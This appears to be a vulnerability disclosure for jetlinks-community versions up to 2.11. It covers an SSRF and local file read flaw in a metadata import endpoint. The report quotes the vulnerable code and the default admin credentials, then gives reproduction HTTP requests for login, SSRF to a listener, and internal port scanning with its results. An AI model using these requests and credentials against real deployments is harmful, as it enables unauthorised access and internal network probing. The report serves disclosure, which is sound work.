# jetlinks-community SSRF + Arbitrary File Read Vulnerability Report

## Introduction to Vulnerabilities

The device metadata import interface `/device/instance/{productId}/property-metadata/import` of jetlinks-community (open-source IoT platform) is vulnerable to SSRF and arbitrary local file read. The `fileUrl` parameter is passed directly to `getInputStream()`: values starting with `http` are fetched via `WebClient` (SSRF), otherwise opened with `new FileInputStream(fileUrl)` (local file read), with no validation. The platform ships a default admin password `JetLinks.C0mmVn1ty`, enabling unauthenticated exploitation.

## Affected Versions

jetlinks-community (org.jetlinks.community) <= 2.11

## Utilize conditions

- Default account `admin` / `JetLinks.C0mmVn1ty`

## Vulnerability Reproduction

**Source (user input point)** — `fileUrl` from the request:

```java
// DeviceInstanceController.java
@PostMapping("/{productId}/property-metadata/import")
@SaveAction
public Mono<String> importPropertyMetadata(@PathVariable String productId,
                                           @RequestParam String fileUrl) {
    ...
    .flatMap(wrapper -> importExportService.getInputStream(fileUrl) ...)  // user-controlled
}
```

![image-20260816142933601](https://github.com/fangtang7/picx-images-hosting/raw/master/jetlinks-community/image-20260816142933601.b9mokuzic.png)

**Sink** — `fileUrl` decides SSRF vs local file read:

```java
// DefaultImportExportService.java
public Mono<InputStream> getInputStream(String fileUrl) {
    return Mono.defer(() -> {
        if (fileUrl.startsWith("http")) {
            return client.get().uri(fileUrl) ...;          // SSRF
        } else {
            return Mono.fromCallable(() -> new FileInputStream(fileUrl)); // local file read
        }
    });
}
```

![image-20260816143042562](https://github.com/fangtang7/picx-images-hosting/raw/master/jetlinks-community/image-20260816143042562.51evmzncsy.png)

Step 1 - Login with default credentials:

```
POST /authorize/login HTTP/1.1
Host: 127.0.0.1:9000
Content-Type: application/json
Content-Length: 55

{"username":"admin","password":"JetLinks.C0mmVn1ty"}
```

```
HTTP/1.1 200
{"result":{"token":"b2a211abf1760f9e0790b190c3325457","currentAuthority":["*"]},"status":200}
```

![image-20260816140826516](https://github.com/fangtang7/picx-images-hosting/raw/master/jetlinks-community/image-20260816140826516.2dpfcmuqak.webp)

Step 2 - SSRF: `fileUrl` points to the attacker's listener (127.0.0.1:9998):

```
POST /device/instance/ssrf-poc3/property-metadata/import?fileUrl=http://127.0.0.1:9998/ssrf-probe HTTP/1.1
Host: 127.0.0.1:9000
X-Access-Token: 2425de217fb2c64c...
```

```
listener receives: GET /ssrf-probe  User-Agent: ReactorNetty/1.2.11
```

![image-20260816142701566](https://github.com/fangtang7/picx-images-hosting/raw/master/jetlinks-community/image-20260816142701566.8l0tcsquc0.webp)

Internal port scanning — different ports yield different connection results:

| fileUrl target                                | Server-side result                    |
| --------------------------------------------- | ------------------------------------- |
| `http://127.0.0.1:6379` (Redis, open)         | `Connection reset` (open)             |
| `http://127.0.0.1:5432` (PostgreSQL, open)    | `Connection reset` (open)             |
| `http://127.0.0.1:9000` (jetlinks, open HTTP) | fetch succeeds, content parsed (open) |
| `http://127.0.0.1:3306` (MySQL, closed)       | `Connection refused` (closed)         |
| `http://127.0.0.1:65534` (none)               | `Connection refused` (closed)         |
